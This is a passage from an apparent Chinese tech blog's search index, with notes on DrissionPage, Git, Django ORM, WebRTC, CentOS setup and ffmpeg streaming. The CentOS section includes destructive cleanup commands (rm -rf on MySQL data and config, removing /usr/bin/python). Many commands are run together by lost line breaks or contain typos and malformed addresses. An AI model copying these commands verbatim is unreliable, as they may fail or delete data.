href="#5-1-动作链" class="headerlink" title="5.1 动作链"></a>5.1 动作链</h3><p>用于模拟一系列键盘和鼠标的操作</p><pre><code class="python">from DrissionPage.common import ActionChains</code></pre><h3 id="5-2-键盘按键类"><a href="#5-2-键盘按键类" class="headerlink" title="5.2 键盘按键类"></a>5.2 键盘按键类</h3><p>用于键入 ctrl、alt 等按键</p><pre><code class="python">from DrissionPage.common import Keys</code></pre><h3 id="5-3-By类"><a href="#5-3-By类" class="headerlink" title="5.3 By类"></a>5.3 By类</h3><p>便于项目迁移</p><pre><code class="python">from DrissionPage.common import By</code></pre><h3 id="5-4-浏览器数据包监听器"><a href="#5-4-浏览器数据包监听器" class="headerlink" title="5.4 浏览器数据包监听器"></a>5.4 浏览器数据包监听器</h3><pre><code class="python">from DrissionPage.common import Listener, RequestMan</code></pre><h3 id="5-5-easy-set"><a href="#5-5-easy-set" class="headerlink" title="5.5 easy_set"></a>5.5 easy_set</h3><p>保存了一些便捷的 ini 文件设置方法，可选择使用</p><pre><code class="python">from DrissionPage.easy_set import *</code></pre><h2 id="6-导入异常"><a href="#6-导入异常" class="headerlink" title="6. 导入异常"></a>6. 导入异常</h2><p>异常放在以下路径</p><pre><code class="python">from DrissionPage.errors import ElementNotFoundError</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DrissionPage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git</title>
      <link href="/2024/05/01/git/"/>
      <url>/2024/05/01/git/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Git（读音为&#x2F;gɪt&#x2F;）是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。也是Linus Torvalds为了帮助管理Linux内核开发而开发的一个开放源码的版本控制软件。<br>Git 是基于 Linux内核开发的版本控制工具。与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持（wingeddevil注：这得分是用什么样的服务端，使用http协议或者git协议等不太一样。并且在push和pull的时候和服务器端还是有交互的。），使源代码的发布和交流极其方便。 Git 的速度很快，这对于诸如 Linux kernel 这样的大项目来说自然很重要。 Git 最为出色的是它的合并跟踪（merge tracing）能力。</p></blockquote><h2 id="第一次初始化"><a href="#第一次初始化" class="headerlink" title="第一次初始化"></a>第一次初始化</h2><pre><code class="bash">git initgit add .git commit -m “first commit”git remote add origin git@github.com:帐号名/仓库名.gitgit pull origin mastergit push origin master -f # 强推git clone git@github.com:git帐号名/仓库名.git # 下载克隆仓库数据</code></pre><h2 id="工作基本操作"><a href="#工作基本操作" class="headerlink" title="工作基本操作"></a>工作基本操作</h2><pre><code class="bash">git checkout master # 切到主分支git fetch origin # 获取最新变更git checkout -b dev origin/master # 基于主分支创建dev分支git add . # 添加到缓存git commit -m “xxx” # 提交到本地仓库git fetch origin # 获取最新变更</code></pre><h2 id="初始化仓库"><a href="#初始化仓库" class="headerlink" title="初始化仓库"></a>初始化仓库</h2><pre><code class="bash">git init</code></pre><h2 id="查看仓库当前状态"><a href="#查看仓库当前状态" class="headerlink" title="查看仓库当前状态"></a>查看仓库当前状态</h2><pre><code class="bash">git status</code></pre><h2 id="文件相关操作"><a href="#文件相关操作" class="headerlink" title="文件相关操作"></a>文件相关操作</h2><h3 id="将文件添加到仓库"><a href="#将文件添加到仓库" class="headerlink" title="将文件添加到仓库"></a>将文件添加到仓库</h3><pre><code class="bash">git add 文件名 # 将工作区的某个文件添加到暂存区git add . # 将当前工作区的所有文件都加入暂存区git add -u # 添加所有被tracked文件中被修改或删除的文件信息到暂存区，不处理untracked的文件git add -A # 添加所有被tracked文件中被修改或删除的文件信息到暂存区，包括untracked的文件git add -i # 进入交互界面模式，按需添加文件到缓存区</code></pre><h3 id="将暂存区文件提交到本地仓库"><a href="#将暂存区文件提交到本地仓库" class="headerlink" title="将暂存区文件提交到本地仓库"></a>将暂存区文件提交到本地仓库</h3><pre><code class="bash">git commit -m “提交说明” # 将暂存区内容提交到本地仓库git commit -a -m “提交说明” # 跳过缓存区操作，直接把工作区内容提交到本地仓库</code></pre><h3 id="比较文件异同"><a href="#比较文件异同" class="headerlink" title="比较文件异同"></a>比较文件异同</h3><pre><code class="bash">git diff # 工作区与暂存区的差异git diff 分支名 # 工作区与某分支的差异，远程分支这样写：remotes/origin/分支名git diff HEAD # 工作区与HEAD指针指向的内容差异git diff 提交id 文件路径 # 工作区某文件当前版本与历史版本的差异git diff –stage # 工作区文件与上次提交的差异(1.6 版本前用 –cached)git diff 版本TAG # 查看从某个版本后都改动内容git diff 分支A 分支B # 比较从分支A和分支B的差异(也支持比较两个TAG)git diff 分支A…分支B # 比较两分支在分开后各自的改动</code></pre><p>另外：如果只想统计哪些文件被改动，多少行被改动，可以添加 –stat 参数</p><h2 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h2><pre><code class="bash">git log # 查看所有commit记录(SHA-A校验和，作者名称，邮箱，提交时间，提交说明)git log -p -次数 # 查看最近多少次的提交记录git log –stat # 简略显示每次提交的内容更改git log –name-only # 仅显示已修改的文件清单git log –name-status # 显示新增，修改，删除的文件清单git log –oneline # 让提交记录以精简的一行输出git log –graph –all –online # 图形展示分支的合并历史git log –author=作者 # 查询作者的提交记录(和grep同时使用要加一个–all–match参数)git log –grep=过滤信息 # 列出提交信息中包含过滤信息的提交记录git log -S查询内容 # 和–grep类似，S和查询内容间没有空格git log fileName # 查看某文件的修改记录</code></pre><h2 id="代码回滚"><a href="#代码回滚" class="headerlink" title="代码回滚"></a>代码回滚</h2><pre><code class="bash">git reset HEAD^ # 恢复成上次提交的版本git reset HEAD^^ # 恢复成上上次提交的版本，就是多个^，以此类推或用~次数git refloggit reset –hard 版本号# –soft：只是改变HEAD指针指向，缓存区和工作区不变；# –mixed：修改HEAD指针指向，暂存区内容丢失，工作区不变；# –hard：修改HEAD指针指向，暂存区内容丢失，工作区恢复以前状态；</code></pre><h2 id="版本库相关操作"><a href="#版本库相关操作" class="headerlink" title="版本库相关操作"></a>版本库相关操作</h2><pre><code class="bash">git rm 文件名 # 删除版本库文件git checkout — test.txt # 版本库里的版本替换工作区的版本</code></pre><h2 id="远程仓库相关操作"><a href="#远程仓库相关操作" class="headerlink" title="远程仓库相关操作"></a>远程仓库相关操作</h2><pre><code class="bash">git push -u origin master # 同步远程仓库git remote add origin git@github.com:账户名/仓库名.git # 本地仓库内容推送到远程仓库git clone git@github.com:git账号名/仓库名.git # 远程仓库克隆项目到本地git remote # 查看远程库信息# 拉取远程分支到本地仓库git checkout -b 本地分支 远程分支 # 会在本地新建分支，并自动切换到该分支git fetch origin 远程分支:本地分支 # 会在本地新建分支，但不会自动切换，还需checkoutgit branch –set-upstream 本地分支 远程分支 # 建立本地分支与远程分支的链接git fetch origin master # 同步远程仓库更新</code></pre><h2 id="分支相关操作"><a href="#分支相关操作" class="headerlink" title="分支相关操作"></a>分支相关操作</h2><h3 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h3><pre><code class="bash">git checkout -b dev # -b 表示创建并切换分支# 上面的一条命令相当于下面的两条git branch dev # 创建分支git checkout dev # 切换分支</code></pre><h3 id="查看分支"><a href="#查看分支" class="headerlink" title="查看分支"></a>查看分支</h3><pre><code class="bash">git branch</code></pre><h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><pre><code class="bash">git merge dev # 用于合并指定分支到当前分支git merge -no-ff -m &quot;merge with no-ff&quot; dev # 加上-no-ff参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并</code></pre><h3 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h3><pre><code class="bash">git branch -d dev</code></pre><h3 id="查看分支合并图"><a href="#查看分支合并图" class="headerlink" title="查看分支合并图"></a>查看分支合并图</h3><pre><code class="bash">git log -graph -pretty=oneline-abbrev-commit</code></pre><h2 id="git相关配置"><a href="#git相关配置" class="headerlink" title="git相关配置"></a>git相关配置</h2><ul><li>安装完Git后第一件要做的事，设置用户信息(global可换成local在单独项目生效)</li></ul><pre><code class="bash">git config –global user.name “用户名” # 设置用户名git config –global user.email “用户邮箱” # 设置邮箱git config –global user.name # 查看用户名是否配置成功git config –global user.email # 查看邮箱是否配置</code></pre><h2 id="其他配置相关"><a href="#其他配置相关" class="headerlink" title="其他配置相关"></a>其他配置相关</h2><pre><code class="bash">git config –global –list # 查看全局设置相关参数列表git config –local –list # 查看本地设置相关参数列表git config –system –list # 查看系统配置参数列表git config –list # 查看所有Git的配置(全局+本地+系统)git config –global color.ui true # 显示git相关颜色</code></pre><h2 id="撤销某次提交"><a href="#撤销某次提交" class="headerlink" title="撤销某次提交"></a>撤销某次提交</h2><pre><code class="bash">git revert HEAD # 撤销最近的一个提交git revert 版本号 # 撤销某次commit</code></pre><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><pre><code class="bash">git tag 标签 # 打标签命令，默认为HEADgit tag # 显示所有标签git tag 标签 版本号 # 给某个commit版本添加标签git show 标签 # 显示某个标签的详细信息</code></pre><h2 id="git配置"><a href="#git配置" class="headerlink" title="git配置"></a>git配置</h2><pre><code class="bash"># 设置git 行尾序列CRLF/LF校验转换git config --global core.autocrlf falsegit config --global core.autocrlf true</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django-Models</title>
      <link href="/2024/05/01/django-models/"/>
      <url>/2024/05/01/django-models/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于Django的模型类的数据增删改查</p></blockquote><pre><code class="python">from user import models</code></pre><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><h3 id="save"><a href="#save" class="headerlink" title="save()"></a>save()</h3><pre><code class="python">book = models.Book(title=&quot;教程&quot;, price=300, publish=&quot;出版社&quot;, pub_date=&quot;2008-8-8&quot;) book.save()</code></pre><h3 id="create"><a href="#create" class="headerlink" title="create()"></a>create()</h3><pre><code class="python">books = models.Book.objects.create(title=&quot;如来神掌&quot;, price=200, publish=&quot;功夫出版社&quot;, pub_date=&quot;2010-10-10&quot;)</code></pre><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><h3 id="符合条件的第一个"><a href="#符合条件的第一个" class="headerlink" title="符合条件的第一个"></a>符合条件的第一个</h3><pre><code class="python">books=models.Book.objects.filter(pk=8).first().delete()</code></pre><h3 id="符合条件的"><a href="#符合条件的" class="headerlink" title="符合条件的"></a>符合条件的</h3><pre><code class="python">books=models.Book.objects.filter(pk__in=[1, 2]).first().delete()</code></pre><h3 id="符合条件的最后一个"><a href="#符合条件的最后一个" class="headerlink" title="符合条件的最后一个"></a>符合条件的最后一个</h3><pre><code class="python">books=models.Book.objects.filter(pk=8).last().delete()</code></pre><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><h3 id="save-1"><a href="#save-1" class="headerlink" title="save()"></a>save()</h3><pre><code class="python">books = models.Book.objects.filter(pk=7).first()books.price = 400books.save()</code></pre><h3 id="update"><a href="#update" class="headerlink" title="update()"></a>update()</h3><pre><code class="python">books = models.Book.objects.filter(pk__in=[7, 8]).update(price=888)</code></pre><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><blockquote><p>查询建议：使用values()配合filter()、exclude()等方法处理表查询，values()返回的是字典的集合，处理方便</p></blockquote><h3 id="所有"><a href="#所有" class="headerlink" title="所有"></a>所有</h3><pre><code class="python"># all(): 类似于 list，里面放的是一个个模型类的对象，可用索引下标取出模型类的对象 比如def就是一个模型类books = models.Book.objects.all()</code></pre><h3 id="第一条"><a href="#第一条" class="headerlink" title="第一条"></a>第一条</h3><pre><code class="python">books = models.Book.objects.first()</code></pre><h3 id="最后一条"><a href="#最后一条" class="headerlink" title="最后一条"></a>最后一条</h3><pre><code class="python">books = models.Book.objects.last()</code></pre><h3 id="部分字段"><a href="#部分字段" class="headerlink" title="部分字段"></a>部分字段</h3><pre><code class="python"># 返回内容键对值 values(): 类似于 list，里面不是模型类的对象，而是一个可迭代的字典序列 比如&#123;name：123&#125;就是字典books = models.Book.objects.values(&quot;pk&quot;, &quot;price&quot;)# 返回内容只有值books = models.Book.objects.values_list(&quot;price&quot;, &quot;publish&quot;)</code></pre><h3 id="单字段并去重"><a href="#单字段并去重" class="headerlink" title="单字段并去重"></a>单字段并去重</h3><pre><code class="python">books = models.Book.objects.values(&quot;price&quot;).distinct()</code></pre><h3 id="符合条件"><a href="#符合条件" class="headerlink" title="符合条件"></a>符合条件</h3><pre><code class="python"># filter(): 类似于 list，里面放的是一个个模型类的对象，可用索引下标取出模型类的对象 比如def就是一个模型类books=models.Book.objects.filter(pk=8)# 查（符合条件-日期单查年）books=models.Book.objects.filter(pub_date__year=2023) # pub_date: 2023-10-15# 查（符合条件-日期单查月）books=models.Book.objects.filter(pub_date__month=10) # pub_date: 2023-10-15# 查（符合条件-日期单查日）books=models.Book.objects.filter(pub_date__day=1) # pub_date: 2023-10-1# 查（__contains 包含，= 号后面为字符串 区分大小写）books=models.Book.objects.filter(title__contains=&quot;菜&quot;)# 查（__icontains 包含 不区分大小写）books=models.Book.objects.filter(title__icontains=&quot;python&quot;)# 查（title__startswith 指定内容开头）books=models.Book.objects.filter(title__startswith=&quot;菜&quot;)# 查（title__endswith 指定内容结尾）books=models.Book.objects.filter(title__endswith=&quot;教程&quot;)# 查（条件in查询）books = models.Book.objects.filter(price__in=[200,300])# 查（区间range查询）books = models.Book.objects.filter(price__range=[200,300])# 查（大于）books = models.Book.objects.filter(price__gt=200)# 查（大于等于）books = models.Book.objects.filter(price__gte=200)# 查（小于）books=models.Book.objects.filter(price__lt=300)# 查（小于等于）books=models.Book.objects.filter(price__lte=300)</code></pre><h3 id="不符合条件"><a href="#不符合条件" class="headerlink" title="不符合条件"></a>不符合条件</h3><pre><code class="python">books = models.Book.objects.exclude(publish=&#39;出版社&#39;, price=300)</code></pre><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><pre><code class="python"># 查询所有，按照价格升序排列 books = models.Book.objects.order_by(&quot;price&quot;)# 查询所有，按照价格降序排列books = models.Book.objects.order_by(&quot;-price&quot;)</code></pre><h3 id="数量"><a href="#数量" class="headerlink" title="数量"></a>数量</h3><pre><code class="python"># 查（符合条件数量）books = models.Book.objects.filter(price=200).count() </code></pre><h3 id="限制数量"><a href="#限制数量" class="headerlink" title="限制数量"></a>限制数量</h3><pre><code class="python"># 查询限制15条books = models.Book.objects.all()[:15]</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebRTC</title>
      <link href="/2024/05/01/frontend-webrtc/"/>
      <url>/2024/05/01/frontend-webrtc/</url>
      
        <content type="html"><![CDATA[<blockquote><p>WebRTC (Web Real-Time Communications) 是一项实时通讯技术，它允许网络应用或者站点，在不借助中间媒介的情况下，建立浏览器之间点对点（Peer-to-Peer）的连接，实现视频流和（或）音频流或者其他任意数据的传输。WebRTC 包含的这些标准使用户在无需安装任何插件或者第三方的软件的情况下，创建点对点（Peer-to-Peer）的数据分享和电话会议成为可能。</p></blockquote><h2 id="媒体设备"><a href="#媒体设备" class="headerlink" title="媒体设备"></a>媒体设备</h2><p>MediaStream是用于获取音频和视频的对象。通过MediaStream可以访问摄像头、麦克风等设备。</p><pre><code class="js">const constraints = &#123;    video: true,    audio: true,&#125;navigator.mediaDevices.getUserMedia(constraints).then((stream) =&gt; &#123;    // stream是获取到的音频或视频流    const localStream = stream&#125;).catch((err) =&gt; &#123;    // 处理错误&#125;)</code></pre><h2 id="核心对象-RTCPeerConnection"><a href="#核心对象-RTCPeerConnection" class="headerlink" title="核心对象 RTCPeerConnection"></a>核心对象 RTCPeerConnection</h2><h3 id="注册RTC"><a href="#注册RTC" class="headerlink" title="注册RTC"></a>注册RTC</h3><p>RTCPeerConnection 作为创建点对点连接的 API,是我们实现音视频实时通信的关键。</p><pre><code class="js">const peerConnection = new RTCPeerConnection()</code></pre><h3 id="媒体协商方法"><a href="#媒体协商方法" class="headerlink" title="媒体协商方法"></a>媒体协商方法</h3><ul><li>createOffer</li></ul><pre><code class="js">peerConnection.createOffer(&#123;    offerToReceiveAudio: 1,    offerToReceiveVideo: 1,&#125;).then(offer =&gt; &#123;    // 获取offer&#125;)</code></pre><ul><li>createAnswer</li></ul><pre><code class="js">peerConnection.createAnswer().then(answer =&gt; &#123;    // 获取answer&#125;)</code></pre><ul><li>setLocalDescription</li></ul><pre><code class="js">// 设置远程offerpeerConnection.setLocalDescription(offer)// 设置远程answerpeerConnection.setLocalDescription(answer)</code></pre><ul><li>setRemoteDescription</li></ul><pre><code class="js">// 设置本地offerpeerConnection.setRemoteDescription(offer)// 设置本地answerpeerConnection.setRemoteDescription(answer)</code></pre><ul><li>addIceCandidate</li></ul><pre><code class="js">(candidate) =&gt; &#123;    // 设置candidate    peerConnection.addIceCandidate(candidate)&#125;</code></pre><ul><li>addStream</li></ul><pre><code class="js">// 设置视频流peerConnection.addStream(localStream)</code></pre><h3 id="重要事件"><a href="#重要事件" class="headerlink" title="重要事件"></a>重要事件</h3><ul><li>onicecandidate</li></ul><pre><code class="js">peerConnection.onicecandidate = (event) =&gt; &#123;    // event.candidate&#125;</code></pre><ul><li>addstream(官方已不推荐事件，建议使用addTrack) &#x2F; addTrack</li></ul><pre><code class="js">// 收到视频流peerConnection.onaddstream = (event) =&gt; &#123;    // event.stream&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebRTC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS</title>
      <link href="/2024/05/01/linux-centos/"/>
      <url>/2024/05/01/linux-centos/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于<a href="mailto:&#67;&#x65;&#x6e;&#x74;&#79;&#83;&#x40;&#55;&#x2e;&#57;">&#67;&#x65;&#x6e;&#x74;&#79;&#83;&#x40;&#55;&#x2e;&#57;</a> 初次使用注意以及基本内容，持续完善中…</p></blockquote><h2 id="首次启动"><a href="#首次启动" class="headerlink" title="首次启动"></a>首次启动</h2><h3 id="创建文件夹-amp-文件"><a href="#创建文件夹-amp-文件" class="headerlink" title="创建文件夹&amp;文件"></a>创建文件夹&amp;文件</h3><pre><code class="shell">cd /makedir myAppcd /myAppecho &gt; myApp.txtecho &#39;追加&#39; &gt;&gt; myApp.txt</code></pre><h3 id="新增用户"><a href="#新增用户" class="headerlink" title="新增用户"></a>新增用户</h3><pre><code class="shell">adduser usernamepasswd username</code></pre><h3 id="关于yum、rpm基本命令"><a href="#关于yum、rpm基本命令" class="headerlink" title="关于yum、rpm基本命令"></a>关于yum、rpm基本命令</h3><pre><code class="shell">yum install -y nameyum remove nameyum cleanyum localinstall rpm包地址# 查询所有rpm包，grep筛选出包含mysql的内容rpm -qa | grep mysql</code></pre><h3 id="python3-11-1安装"><a href="#python3-11-1安装" class="headerlink" title="python3.11.1安装"></a>python3.11.1安装</h3><pre><code class="shell"># 下载文件到临时目录cd /tempwget https://www.python.org/ftp/python/3.11.1/Python-3.11.1.tgztar -xzf Python-3.11.1.tgz# 安装依赖环境yum -y install gcc zlib zlib-devel libffi libffi-develyum install readline-develyum install openssl-devel openssl11 openssl11-develexport CFLAGS=$(pkg-config --cflags openssl11)export LDFLAGS=$(pkg-config --libs openssl11)# 进入下载文件解压地址cd Python-3.11.1# 指定安装路径./configure --prefix=/usr/bin/python3.11 --with-sslmakemake install# 软链指向ln -s /usr/bin/python3.11/bin/python3 /usr/bin/python3ln -s /usr/bin/python3.11/bin/pip3 /usr/bin/pip3</code></pre><h3 id="修改python默认版本软链指向"><a href="#修改python默认版本软链指向" class="headerlink" title="修改python默认版本软链指向"></a>修改python默认版本软链指向</h3><pre><code class="shell"># 慎重修改， 部分系统安装是默认依赖版本是python2sudo rm -rf /usr/bin/pythonsudo ln -s /usr/bin/python3 /usr/bin/python</code></pre><h3 id="67-x65-x6e-116-79-x53-64-55-x2e-57-安装mysql"><a href="#67-x65-x6e-116-79-x53-64-55-x2e-57-安装mysql" class="headerlink" title="&#67;&#x65;&#x6e;&#116;&#79;&#x53;&#64;&#55;&#x2e;&#57; 安装mysql"></a><a href="mailto:&#67;&#x65;&#x6e;&#116;&#79;&#x53;&#64;&#55;&#x2e;&#57;">&#67;&#x65;&#x6e;&#116;&#79;&#x53;&#64;&#55;&#x2e;&#57;</a> 安装mysql</h3><pre><code class="shell"># 检查历史版本rpm -qa | grep -i mysqlrpm -qa | grep -i mariadb# 卸载历史版本（如已安装过）yum remove -y mysql安装包名称yum remove -y mariadb安装包名称# 清理残留数据目录及文件-示例# 删除安装目录whereis mysqlrm -rf /usr/lib64/mysql /usr/share/mysql# 删除数据目录rm -rf /var/lib/mysql# 删除配置文件rm -rf /etc/my.cnf# 删除日志文件rm -rf /var/log/mysqlrm -rf /var/log/mysqld.log# 删除临时文件rm -rf /tmp/mysql*# 删除服务和启动脚本rm -rf /etc/init.d/mysqlrm -rf /usr/lib/systemd/system/mysql.service# 下载mysql官方yum源wget  https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm# 安装官方yum源rpm -ivh mysql80-community-release-el7-3.noarch.rpm# 清理yum缓存目录yum clean all# 重新上传yum缓存yum makecache# 导入GPG密钥（查看官方最新源https://repo.mysql.com/）rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2023# 安装mysqlyum install -y mysql-community-server mysql-communitymysql -V# 查看临时初始密码grep &#39;temporary password&#39; /var/log/mysqld.log</code></pre><h2 id="日志查询跟踪"><a href="#日志查询跟踪" class="headerlink" title="日志查询跟踪"></a>日志查询跟踪</h2><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>grep 命令是一个全局查找正则表达式并且打印结果行的命令。</p><pre><code class="shell"># 输出查询到的包含 test 的行内容grep &#39;test&#39; test.log# 输出查询到的包含 test 的行内容(不区分大小写)grep -i &#39;test&#39; test.log# 输出查询到的包含 test 的行内容并向下查20行grep -A 20 &#39;test&#39; test.log</code></pre><h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>tail 命令可以将文件指定位置到文件结束的内容写到标准输出。</p><pre><code class="shell"># 1、输出最后200个字符tail -c 200 test.log# 2、从第900个字符开始输出，一直到最后tail -c +900 test.log# 3、输出最后20行tail -n 20 test.log# 4、从第36行开始输出，一直到最后tail -n +36 test.log# 5、输出指定文件的最后十行，同时继续监视文件内容有无变化，新增内容会继续输出，直到按下 [Ctrl-C] 组合键退出 || 文件改名或被删除tail -f test.log# 6、输出指定文件的最后十行，同时继续监视文件内容有无变化，新增内容会继续输出，直到按下 [Ctrl-C] 组合键退出tail -F test.log# 7、输出指定文件的最后20行，同时继续监视文件内容有无变化，新增内容会继续输出，直到按下 [Ctrl-C] 组合键退出 || 文件改名或被删除tail -f -n 20 test.log# 8、指定多个文件并输出文件名tail -v test1.log test2.log# 9、指定多个文件不输出文件名tail -q test1.log test2.log# 【Ctrl】+【S】 暂停刷新。# 【Ctrl】+【Q】继续刷新。# 【Ctrl】+【C】退出 tail 命令。</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Media Server</title>
      <link href="/2024/03/15/node-mediaserver/"/>
      <url>/2024/03/15/node-mediaserver/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Node项目搭建Media Server</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>后管地址 127.0.0.1:8000&#x2F;admin&#x2F;<br>接口：<a href="http://127.0.0.1:8000/api/server">http://127.0.0.1:8000/api/server</a> &#x2F;&#x2F; 性能线程监控<br>接口：<a href="http://127.0.0.1:8000/api/streams">http://127.0.0.1:8000/api/streams</a> &#x2F;&#x2F; 查询推流列表</p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Media </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ffmpeg</title>
      <link href="/2024/03/15/linux-ffmpeg/"/>
      <url>/2024/03/15/linux-ffmpeg/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于推流、拉流命令行控制及开发依赖</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="shell">conda install ffmpeg -c conda-forge</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><pre><code class="shell"> # dshow可以用来抓取摄像头、采集卡、麦克风等，vfwcap主要用来采集摄像头类设备，gdigrab则是取Windows窗口程序 ffmpeg -list_devices true -f dshow -i dummy # 查询可用dshow设备-f vfwcap -i &quot;0&quot; # 启用摄像头-f gdigrab -i desktop 启用桌面录制 -f gdigrab -i title=&quot;&quot; # 启用应用录制-f dshow -i video=&quot;&quot; 指定video设备 -f dshow -i audio=&quot;&quot; # 指定audio设备-re -stream_loop -1 # 重复-vcodec libx264 -preset ultrafast # video指定解码配置-acodec libmp3lame -ar 44100 -ac 1 # audio指定解码配置-c:v libx264 -preset ultrafast  # vfwcap摄像头使用video配置</code></pre><h3 id="RTMP协议推流"><a href="#RTMP协议推流" class="headerlink" title="RTMP协议推流"></a>RTMP协议推流</h3><pre><code class="shell"># 重复推流test.mp4至rtmp接口ffmpeg -re -stream_loop -1 -i test.mp4 -vcodec libx264 -preset ultrafast -f flv rtmp:/localhost:1935/stream/test# 摄像头推流至rtmp接口（不包含acodec）ffmpeg -f vfwcap  -i &quot;0&quot; -c:v libx264 -preset ultrafast -f flv rtmp://localhost:1935media/home# 桌面desktop推流至rtmp接口（不包含acodec）ffmpeg -f gdigrab -i desktop -vcodec libx264 -preset ultrafast -f flv rtmp://192.168.5251:1935/media/home</code></pre><h3 id="ffmpeg本地"><a href="#ffmpeg本地" class="headerlink" title="ffmpeg本地"></a>ffmpeg本地</h3><pre><code class="shell"># 从视频中提取音频ffmpeg.exe -i aa.mp4 -vn -c:a copy output.aac# -vn 表示去掉视频， -c:a copy表示不改变音频编码，直接拷贝。# 进行指定时间截图ffmpeg.exe -ss 0:8:34 -i aa.mp4 -vframes 1 -q:v 2 output.jpg# -vframes1表示只截取一帧， -q:v2表示输出的图片质量，通常范围在1到5之间（1 为最高质量）# 为音频添加封面ffmpeg -loop 1 -i cover.jpg -i input.mp3 -c:v libx264 -c:a aac -b:a 192k -shortest output.mp4# 以上命令中，有两个输入文件，一个是封面图片 cover.jpg，另一个是音频文件 input.mp3。-loop1参数表示图片无限循环，  -shortest参数表示音频文件结束时，输出视频也随之结束。# MP4 转 M3U8ffmpeg -i input.mp4 -c:v libx264 -c:a aac -strict -2 -f hls -hlslistsize 2 -hls_time 15 output.m3u8# 该命令将 input.mp4 视频文件每15秒生成一个 ts 文件，并最后生成一个 m3u8 文件，m3u8 文件则作为 ts 的索引文件。# 屏幕录制并保存成文件ffmpeg -f gdigrab -i desktop eguid.mp4# 转流（rtsp转rtmp为例）ffmpeg -i rtsp://184.72.239.149/vod/mp4://BigBuckBunny_175k.mov -rtsp_transport tcp -vcodec h264 -acodec aac -f flv rtmp://localhost:1935/rtmp/eguid# 拉流ffmpeg -i rtmp://eguid.cc:1935/rtmp/eguid -vcodec h264 -f flv -acodec aac -ac 2 eguid.flv</code></pre>]]></content>
      
      
      <categories>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ffmpeg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ffmpeg</title>
      <link href="/2024/03/15/win-ffmpeg/"/>
      <url>/2024/03/15/win-ffmpeg/</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于推流、拉流命令行控制及开发依赖</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><pre><code class="shell"> # dshow可以用来抓取摄像头、采集卡、麦克风等，vfwcap主要用来采集摄像头类设备，gdigrab则是取Windows窗口程序 ffmpeg -list_devices true -f dshow -i dummy # 查询可用dshow设备-f vfwcap -i &quot;0&quot; # 启用摄像头-f gdigrab -i desktop 启用桌面录制 -f gdigrab -i title=&quot;&quot; # 启用应用录制-f dshow -i video=&quot;&quot; 指定video设备 -f dshow -i audio=&quot;&quot; # 指定audio设备-re -stream_loop -1 # 重复-vcodec libx264 -preset ultrafast # video指定解码配置-acodec libmp3lame -ar 44100 -ac 1 # audio指定解码配置-c:v libx264 -preset ultrafast  # vfwcap摄像头使用video配置</code></pre><h3 id="RTMP协议推流"><a href="#RTMP协议推流" class="headerlink" title="RTMP协议推流"></a>RTMP协议推流</h3><pre><code class="shell"># 重复推流test.mp4至rtmp接口ffmpeg -re -stream_loop -1 -i test.mp4 -vcodec libx264 -preset ultrafast -f flv 